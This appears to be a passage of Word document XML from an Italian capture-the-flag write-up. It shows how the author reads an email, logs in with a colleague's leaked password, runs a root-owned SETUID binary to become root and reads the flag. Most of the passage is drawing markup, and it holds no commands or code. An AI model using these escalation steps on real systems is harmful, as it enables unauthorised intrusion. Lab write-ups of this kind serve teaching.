        <w:t xml:space="preserve"> ci viene indicato </w:t>
      </w:r>
      <w:r w:rsidR="00E7474C">
        <w:t xml:space="preserve">che abbiamo una </w:t>
      </w:r>
      <w:r>
        <w:t>mail</w:t>
      </w:r>
      <w:r w:rsidR="00E7474C">
        <w:t xml:space="preserve"> da </w:t>
      </w:r>
      <w:r w:rsidR="00877FB6">
        <w:t>leggere; quindi,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> andiamo a capirne qualcosa in più andando </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>nella cartelle</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> email</w:t>
      </w:r>
      <w:r w:rsidR="00E7474C">
        <w:t xml:space="preserve"> e andiamo a leggerla tramite </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00E7474C">
        <w:t>cat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00E7474C">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FFCA9F7" w14:textId="78874359" w:rsidR="00B66AB1" w:rsidRPr="00E7474C" w:rsidRDefault="00D26E80" w:rsidP="00E7474C">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251710464" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="782FB087" wp14:editId="2C783ADD">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>1246454</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>2304693</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="714166" cy="226171"/>
                <wp:effectExtent l="0" t="0" r="10160" b="21590"/>
                <wp:wrapNone/>
                <wp:docPr id="1277922540" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="714166" cy="226171"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="25400" cap="flat" cmpd="sng" algn="ctr">
                          <a:solidFill>
                            <a:srgbClr val="00B0F0"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                        </a:ln>
                        <a:effectLst/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="18E978BB" w14:textId="77777777" w:rsidR="00D26E80" w:rsidRDefault="00D26E80" w:rsidP="00D26E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FB087" id="_x0000_s1053" style="position:absolute;left:0;text-align:left;margin-left:98.15pt;margin-top:181.45pt;width:56.25pt;height:17.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95UQIAAJ0EAAAOAAAAZHJzL2Uyb0RvYy54bWysVE1v2zAMvQ/YfxB0X20HabIGdYosQYYB&#10;RRugHXpWZCk2IIsapcTufv0o2W26bqdhF5kUKX48Pvr6pm8NOyn0DdiSFxc5Z8pKqBp7KPn3x+2n&#10;z5z5IGwlDFhV8mfl+c3y44frzi3UBGowlUJGQaxfdK7kdQhukWVe1qoV/gKcsmTUgK0IpOIhq1B0&#10;FL012STPZ1kHWDkEqbyn281g5MsUX2slw73WXgVmSk61hXRiOvfxzJbXYnFA4epGjmWIf6iiFY2l&#10;pK+hNiIIdsTmj1BtIxE86HAhoc1A60aq1AN1U+TvunmohVOpFwLHu1eY/P8LK+9OD26HBEPn/MKT&#10;GLvoNbbxS/WxPoH1/AqW6gOTdDkvpsVsxpkk02QyK+ZFBDM7P3bow1cFLYtCyZFmkSASp1sfBtcX&#10;l5jLwrYxJs3DWNZR0MtpTiOTgmihjQgktq4qubcHzoQ5EN9kwBTSg2mq+DwG8njYrw2yk4gzz7/k&#10;2zRmquw3t5h7I3w9+CXT2ICxMYxK7BlLPYMTpdDve9ZQKZN5fBKv9lA975AhDAzzTm4bSnArfNgJ&#10;JEpRJ7Qm4Z4ObYDag1HirAb8+bf76E+TJitnHVGUWv9xFKg4M98sceCqmE4jp5MyvZxPSMG3lv1b&#10;iz22ayBEClpIJ5MY/YN5ETVC+0TbtIpZySSspNwDyKOyDsPq0D5KtVolN+KxE+HWPjgZg0foIrSP&#10;/ZNAN84+EGnu4IXOYvGOAoPvQILVMYBuEj/OuBKvokI7kBg27mtcsrd68jr/VZa/AAAA//8DAFBL&#10;AwQUAAYACAAAACEA3lxdkd4AAAALAQAADwAAAGRycy9kb3ducmV2LnhtbEyPTWrDMBCF94XeQUyg&#10;u0ZORI3tWg6lUOgihTbJARRrYptaIyMpiXP7Tlftbh7z8X7qzexGccEQB08aVssMBFLr7UCdhsP+&#10;7bEAEZMha0ZPqOGGETbN/V1tKuuv9IWXXeoEm1CsjIY+pamSMrY9OhOXfkLi38kHZxLL0EkbzJXN&#10;3SjXWZZLZwbihN5M+Npj+707Ow1u25YhvXfq8KmK23bYJ3lyH1o/LOaXZxAJ5/QHw299rg4Ndzr6&#10;M9koRtZlrhjVoPJ1CYIJlRU85shHWTyBbGr5f0PzAwAA//8DAFBLAQItABQABgAIAAAAIQC2gziS&#10;/gAAAOEBAAATAAAAAAAAAAAAAAAAAAAAAABbQ29udGVudF9UeXBlc10ueG1sUEsBAi0AFAAGAAgA&#10;AAAhADj9If/WAAAAlAEAAAsAAAAAAAAAAAAAAAAALwEAAF9yZWxzLy5yZWxzUEsBAi0AFAAGAAgA&#10;AAAhALNqP3lRAgAAnQQAAA4AAAAAAAAAAAAAAAAALgIAAGRycy9lMm9Eb2MueG1sUEsBAi0AFAAG&#10;AAgAAAAhAN5cXZHeAAAACwEAAA8AAAAAAAAAAAAAAAAAqwQAAGRycy9kb3ducmV2LnhtbFBLBQYA&#10;AAAABAAEAPMAAAC2BQAAAAA=&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="18E978BB" w14:textId="77777777" w:rsidR="00D26E80" w:rsidRDefault="00D26E80" w:rsidP="00D26E80">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap anchorx="margin"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00E7474C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3B3EA5F9" wp14:editId="41EA443B">
            <wp:extent cx="5274310" cy="2973070"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:docPr id="402034205" name="Immagine 1" descr="Immagine che contiene testo, schermata, menu,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4205" name="Immagine 1" descr="Immagine che contiene testo, schermata, menu, Carattere&#10;&#10;Descrizione generata automaticamente"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId57"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="2973070"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00E7474C" w:rsidRPr="006C1913">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Figura 2</w:t>
      </w:r>
      <w:r w:rsidR="00E7474C">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidR="00E7474C" w:rsidRPr="006C1913">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00E7474C">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Lettura </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00E7474C">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>dell’email</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="1B8FE4A3" w14:textId="77777777" w:rsidR="00E7474C" w:rsidRDefault="00E7474C" w:rsidP="00033D6F">
      <w:pPr>
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="761F370E" w14:textId="1F9642BE" w:rsidR="00E7474C" w:rsidRDefault="00811CC3" w:rsidP="00033D6F">
      <w:pPr>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Secondo questo messaggio, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Jen</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> conosce la password dell'account Moss, quindi possiamo usare le credenziali di Moss per effettuare l’accesso.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74FF1F49" w14:textId="79C00BAC" w:rsidR="00D26E80" w:rsidRDefault="00D26E80" w:rsidP="00033D6F">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Nella Figura 26, dopo che siamo entrati come MOSS andiamo ad ispezionare le cartelle, e troviamo un file con il </w:t>
      </w:r>
      <w:r w:rsidRPr="00D26E80">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>SETUID</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> attivo e con l’utente proprietario </w:t>
      </w:r>
      <w:r w:rsidRPr="00D26E80">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>ROOT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FB69508" w14:textId="52FB4D81" w:rsidR="00D26E80" w:rsidRDefault="00D26E80" w:rsidP="00033D6F">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Quindi avendo il SETUID attivo possiamo acquisire i privilegi dell’utente proprietario, cioè, elevarci a root. Eseguiamo il file </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D26E80">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>upyourgame</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DC1027A" w14:textId="36C99E7A" w:rsidR="00D26E80" w:rsidRPr="00D26E80" w:rsidRDefault="001A0050" w:rsidP="00033D6F">
      <w:pPr>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Ci vengono poste alcune domande quando eseguiamo il file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FDD32D5" w14:textId="0B441E92" w:rsidR="00E7474C" w:rsidRDefault="00D26E80" w:rsidP="001A0050">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251712512" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="108C1D1F" wp14:editId="28A06902">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>5006</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>2996828</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="2562990" cy="99357"/>
                <wp:effectExtent l="0" t="0" r="27940" b="15240"/>
                <wp:wrapNone/>
                <wp:docPr id="853602938" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="2562990" cy="99357"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="25400" cap="flat" cmpd="sng" algn="ctr">
                          <a:solidFill>
                            <a:srgbClr val="00B0F0"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                        </a:ln>
                        <a:effectLst/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="1B76EC28" w14:textId="77777777" w:rsidR="00D26E80" w:rsidRDefault="00D26E80" w:rsidP="00D26E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C1D1F" id="_x0000_s1054" style="position:absolute;left:0;text-align:left;margin-left:.4pt;margin-top:235.95pt;width:201.8pt;height:7.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xpUAIAAJ0EAAAOAAAAZHJzL2Uyb0RvYy54bWysVEtv2zAMvg/YfxB0X+xk6SNBnSJrkWFA&#10;0AZoh54VWYoNyJJGKbGzXz9Sdpqu22nYRSZFio+PH31z2zWGHRSE2tmCj0c5Z8pKV9Z2V/Dvz6tP&#10;15yFKGwpjLOq4EcV+O3i44eb1s/VxFXOlAoYBrFh3vqCVzH6eZYFWalGhJHzyqJRO2hERBV2WQmi&#10;xeiNySZ5fpm1DkoPTqoQ8Pa+N/JFiq+1kvFR66AiMwXH2mI6IZ1bOrPFjZjvQPiqlkMZ4h+qaERt&#10;MelrqHsRBdtD/UeoppbggtNxJF2TOa1rqVIP2M04f9fNUyW8Sr0gOMG/whT+X1j5cHjyG0AYWh/m&#10;AUXqotPQ0BfrY10C6/gKluoik3g5ubiczGaIqUTbbPb54orAzM6PPYT4VbmGkVBwwFkkiMRhHWLv&#10;enKhXNatamPSPIxlLSWY5hReIC20ERHFxpcFD3bHmTA75JuMkEIGZ+qSnlOgALvtnQF2EDTz/Eu+&#10;SmPGyn5zo9z3IlS9XzINDRhLYVRiz1DqGRySYrftWI2lTK7pCV1tXXncAAPXMyx4uaoxwVqEuBGA&#10;lMJOcE3iIx7aOGzPDRJnlYOff7snf5w0WjlrkaLY+o+9AMWZ+WaRA7PxdEqcTsr04mqCCry1bN9a&#10;7L65c4jIGBfSyySSfzQnUYNrXnCblpQVTcJKzN2DPCh3sV8d3Eeplsvkhjz2Iq7tk5cUnKAjaJ+7&#10;FwF+mH1E0jy4E53F/B0Fet+eBMt9dLpO/DjjirwiBXcgMWzYV1qyt3ryOv9VFr8AAAD//wMAUEsD&#10;BBQABgAIAAAAIQDj47+y3gAAAAgBAAAPAAAAZHJzL2Rvd25yZXYueG1sTI9BT8JAEIXvJv6HzZB4&#10;ky1SpdRuiTEx8YCJAj9g6Q5tQ3e26Q5Q/r3jSW7z8l7e+6ZYjb5TZxxiG8jAbJqAQqqCa6k2sNt+&#10;PGagIltytguEBq4YYVXe3xU2d+FCP3jecK2khGJuDTTMfa51rBr0Nk5DjyTeIQzessih1m6wFyn3&#10;nX5KkhftbUuy0Nge3xusjpuTN+DX1XLgz3q++55n13W7ZX3wX8Y8TMa3V1CMI/+H4Q9f0KEUpn04&#10;kYuqMyDcbCBdzJagxE6TNAW1lyNbPIMuC337QPkLAAD//wMAUEsBAi0AFAAGAAgAAAAhALaDOJL+&#10;AAAA4QEAABMAAAAAAAAAAAAAAAAAAAAAAFtDb250ZW50X1R5cGVzXS54bWxQSwECLQAUAAYACAAA&#10;ACEAOP0h/9YAAACUAQAACwAAAAAAAAAAAAAAAAAvAQAAX3JlbHMvLnJlbHNQSwECLQAUAAYACAAA&#10;ACEA4le8aVACAACdBAAADgAAAAAAAAAAAAAAAAAuAgAAZHJzL2Uyb0RvYy54bWxQSwECLQAUAAYA&#10;CAAAACEA4+O/st4AAAAIAQAADwAAAAAAAAAAAAAAAACqBAAAZHJzL2Rvd25yZXYueG1sUEsFBgAA&#10;AAAEAAQA8wAAALUFAAAAAA==&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="1B76EC28" w14:textId="77777777" w:rsidR="00D26E80" w:rsidRDefault="00D26E80" w:rsidP="00D26E80">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap anchorx="margin"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidRPr="00D26E80">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1C70AC77" wp14:editId="3ACDEFCD">
            <wp:extent cx="5274310" cy="4493895"/>
            <wp:effectExtent l="0" t="0" r="2540" b="1905"/>
            <wp:docPr id="168042856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28563" name="Immagine 1" descr="Immagine che contiene testo, schermata&#10;&#10;Descrizione generata automaticamente"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId58"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="4493895"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="001A0050" w:rsidRPr="006C1913">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Figura 2</w:t>
      </w:r>
      <w:r w:rsidR="001A0050">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r w:rsidR="001A0050" w:rsidRPr="006C1913">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="001A0050">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>scoperta ed esecuzione del file con il SETUID attivo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4843BA0E" w14:textId="77777777" w:rsidR="001A0050" w:rsidRDefault="001A0050" w:rsidP="00033D6F">
      <w:pPr>
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27CCD15B" w14:textId="7FBE9411" w:rsidR="00E7474C" w:rsidRPr="001A0050" w:rsidRDefault="001A0050" w:rsidP="00033D6F">
      <w:pPr>
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve">Dopo aver risposto alle domande, andiamo a capire chi siamo e il nostro id e andiamo a leggere </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>la nostra flag</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>. In questo modo abbiamo vinto la nostra sfida.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E6D8FEE" w14:textId="2620194B" w:rsidR="00E7474C" w:rsidRPr="001A0050" w:rsidRDefault="001A0050" w:rsidP="001A0050">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251718656" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="3C27A51F" wp14:editId="3DC173E8">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>-15018</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>974624</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="2082430" cy="132094"/>
                <wp:effectExtent l="0" t="0" r="13335" b="20320"/>
                <wp:wrapNone/>
                <wp:docPr id="86901576" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="2082430" cy="132094"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="25400" cap="flat" cmpd="sng" algn="ctr">
                          <a:solidFill>
                            <a:srgbClr val="00B0F0"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                        </a:ln>
                        <a:effectLst/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="497A47D8" w14:textId="77777777" w:rsidR="001A0050" w:rsidRDefault="001A0050" w:rsidP="001A00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7A51F" id="_x0000_s1055" style="position:absolute;left:0;text-align:left;margin-left:-1.2pt;margin-top:76.75pt;width:163.95pt;height:10.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Ap6UQIAAJ4EAAAOAAAAZHJzL2Uyb0RvYy54bWysVE1v2zAMvQ/YfxB0X+246dYEcYosRYYB&#10;RVugLXpWZCk2IIsapcTufv0o2W2ybqdhF5kUKX48Pnpx1beGHRT6BmzJJ2c5Z8pKqBq7K/nT4+bT&#10;JWc+CFsJA1aV/EV5frX8+GHRubkqoAZTKWQUxPp550peh+DmWeZlrVrhz8ApS0YN2IpAKu6yCkVH&#10;0VuTFXn+OesAK4cglfd0ez0Y+TLF11rJcKe1V4GZklNtIZ2Yzm08s+VCzHcoXN3IsQzxD1W0orGU&#10;9C3UtQiC7bH5I1TbSAQPOpxJaDPQupEq9UDdTPJ33TzUwqnUC4Hj3RtM/v+FlbeHB3ePBEPn/NyT&#10;GLvoNbbxS/WxPoH18gaW6gOTdFnkl8X0nDCVZJucF/lsGtHMjq8d+vBNQcuiUHKkYSSMxOHGh8H1&#10;1SUms7BpjEkDMZZ1lOFimsf4gnihjQgktq4qubc7zoTZEeFkwBTSg2mq+DwG8rjbrg2yg4hDz7/m&#10;mzRnquw3t5j7Wvh68EumsQFjYxiV6DOWekQnSqHf9qyhUopZfBKvtlC93CNDGCjmndw0lOBG+HAv&#10;kDhFndCehDs6tAFqD0aJsxrw59/uoz+NmqycdcRRav3HXqDizHy3RILZZDqNpE7K9OJLQQqeWran&#10;Frtv10CITGgjnUxi9A/mVdQI7TOt0ypmJZOwknIPII/KOgy7Qwsp1WqV3IjIToQb++BkDB6hi9A+&#10;9s8C3Tj7QKy5hVc+i/k7Cgy+AwlW+wC6Sfw44kq8igotQWLYuLBxy0715HX8rSx/AQAA//8DAFBL&#10;AwQUAAYACAAAACEAhwj4n98AAAAKAQAADwAAAGRycy9kb3ducmV2LnhtbEyPwU7DMBBE70j8g7VI&#10;3FqHuIES4lQICYlDkUrbD3DjbRIRryPbbdO/ZznBbXdmNPu2Wk1uEGcMsfek4WGegUBqvO2p1bDf&#10;vc+WIGIyZM3gCTVcMcKqvr2pTGn9hb7wvE2t4BKKpdHQpTSWUsamQ2fi3I9I7B19cCbxGlppg7lw&#10;uRtknmWP0pme+EJnRnzrsPnenpwGt26eQ/po1X6jltd1v0vy6D61vr+bXl9AJJzSXxh+8RkdamY6&#10;+BPZKAYNs3zBSdYLVYDggMoLHg6sPC0UyLqS/1+ofwAAAP//AwBQSwECLQAUAAYACAAAACEAtoM4&#10;kv4AAADhAQAAEwAAAAAAAAAAAAAAAAAAAAAAW0NvbnRlbnRfVHlwZXNdLnhtbFBLAQItABQABgAI&#10;AAAAIQA4/SH/1gAAAJQBAAALAAAAAAAAAAAAAAAAAC8BAABfcmVscy8ucmVsc1BLAQItABQABgAI&#10;AAAAIQCj4Ap6UQIAAJ4EAAAOAAAAAAAAAAAAAAAAAC4CAABkcnMvZTJvRG9jLnhtbFBLAQItABQA&#10;BgAIAAAAIQCHCPif3wAAAAoBAAAPAAAAAAAAAAAAAAAAAKsEAABkcnMvZG93bnJldi54bWxQSwUG&#10;AAAAAAQABADzAAAAtwUAAAAA&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="497A47D8" w14:textId="77777777" w:rsidR="001A0050" w:rsidRDefault="001A0050" w:rsidP="001A0050">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>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03FFE943" wp14:editId="74BAA201">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>5006</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>353899</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="2803270" cy="139107"/>
                <wp:effectExtent l="0" t="0" r="16510" b="13335"/>
                <wp:wrapNone/>
                <wp:docPr id="65422279" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="2803270" cy="139107"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="25400" cap="flat" cmpd="sng" algn="ctr">
                          <a:solidFill>
                            <a:srgbClr val="00B0F0"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                        </a:ln>
                        <a:effectLst/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
